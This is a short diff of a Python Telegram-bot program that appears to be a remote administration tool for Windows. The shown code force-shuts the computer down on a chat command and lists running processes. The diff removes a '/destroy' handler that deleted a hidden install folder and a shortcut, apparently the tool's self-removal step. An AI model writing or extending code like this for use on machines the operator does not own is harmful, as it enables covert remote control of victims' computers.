@@ -437,13 +437,7 @@ def handle(msg):
 				bot.sendChatAction(chat_id, 'typing')
 				command = os.popen('shutdown /s /f /t 0')
 				response = wname + ': Computer will be shutdown NOW.'
-			elif command == '/destroy' and destroy == True:
-				bot.sendChatAction(chat_id, 'typing')
-				if os.path.exists(hide_folder):
-					rmtree(hide_folder)
-				if os.path.isfile(target_shortcut):
-					os.remove(target_shortcut)
-				os._exit(0)
+			
 			elif command == '/tasklist':
 				lines = os.popen('tasklist /FI \"STATUS ne NOT RESPONDING\"')
 				response2 = ''
